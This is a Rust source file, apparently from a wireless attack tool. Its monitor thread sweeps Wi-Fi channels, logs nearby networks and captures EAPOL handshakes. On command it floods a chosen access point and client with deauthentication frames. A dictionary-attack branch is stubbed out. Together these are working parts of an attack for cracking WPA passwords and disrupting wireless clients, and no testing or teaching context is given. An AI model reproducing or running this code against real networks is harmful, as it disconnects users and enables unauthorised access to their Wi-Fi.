use crate::ipc::{IPCMessage,IPC,IOCommand};
use wpa::{NetworkInfo,AttackInfo,DeauthAttack,DictionaryAttack};
use std::sync::mpsc::{Sender,Receiver};
use std::collections::HashMap;
use core::time;

const MAX_CHANNEL: usize = 13;
pub type MonitorSender = Sender<IPCMessage<HashMap<String,NetworkInfo>>>;
pub type MonitorReciever = Receiver<IPCMessage<HashMap<String,NetworkInfo>>>;
type Bssid = String;
pub struct MonitorThread{
    iface: String,
    channels: IPC<HashMap<String,NetworkInfo>>,
    networks: HashMap<Bssid, NetworkInfo>,
    sweep_mode: bool,
}

impl MonitorThread{
    pub fn init(iface:&str, rx:MonitorReciever, tx:MonitorSender) -> Self{
        MonitorThread{
            iface: iface.to_owned(),
            channels: IPC{
                rx,
                tx
            },
            networks: HashMap::new(),
            sweep_mode: false,
        }

    }

    pub fn run(&mut self){
        let mut channel = 0;
        loop{
            if self.sweep_mode{ //iterate channel if sweep mode is on
                channel = aux::modulos((channel+1) as i32,(MAX_CHANNEL+1) as i32) as u8;
                wlan::switch_iface_channel(&self.iface, channel);
            }
            //listen for new frames
            match wpa::listen_and_collect(&self.iface, time::Duration::from_secs(1)){
                Ok(captured_msgs) =>{
                    for msg in captured_msgs{
                        match msg{
                            wpa::ParsedFrame::Network(mut netinfo)=>{
                                self.networks.entry(hex::encode(netinfo.bssid))
                                    .and_modify(|e| e.update(&mut netinfo))
                                    .or_insert(netinfo);
                            },
                            wpa::ParsedFrame::Eapol(eapol)=>{
                                let entry = self.networks.iter().find(|(_,e)| hex::encode(e.bssid) == eapol.bssid);
                                if let Some((k,_)) = entry{
                                    self.networks.entry(k.clone()).and_modify(|e|e.add_eapol(eapol));
                                }
                            }
                        }
                    }
                },
                Err(_) => { self.channels.tx.send(IPCMessage::PermissionsError);},
            }
            //send back network information
            self.channels.tx.send(IPCMessage::Message(self.networks.clone()));

            //check if got new message
            if let Ok(msg) = self.channels.rx.try_recv(){
                match msg{
                    IPCMessage::IOCommand(cmd) =>{
                        match cmd{
                            IOCommand::Sweep =>{
                                self.sweep_mode = true;
                            },
                            IOCommand::ChangeChannel(c) =>{
                                wlan::switch_iface_channel(&self.iface, c);
                                self.sweep_mode = false;
                            },
                            _ =>{}//do nothing
                        }
                    },
                    IPCMessage::Attack(attack_info) =>{
                        match attack_info{
                            AttackInfo::DeauthAttack(attack) =>{
                                wlan::switch_iface_channel(&self.iface, attack.station_channel);
                                for _ in 0..32 {
                                    wpa::send_deauth(&self.iface, &attack.bssid, attack.client.clone());
                                }
                                wlan::switch_iface_channel(&self.iface,channel);
                            },
                            AttackInfo::DictionaryAttack(attack) =>{
                                todo!();
                            }
                        }
                    },
                    IPCMessage::EndCommunication => {
                        return;
                    },
                    _=>{},
                }
            }
        }
    }

}



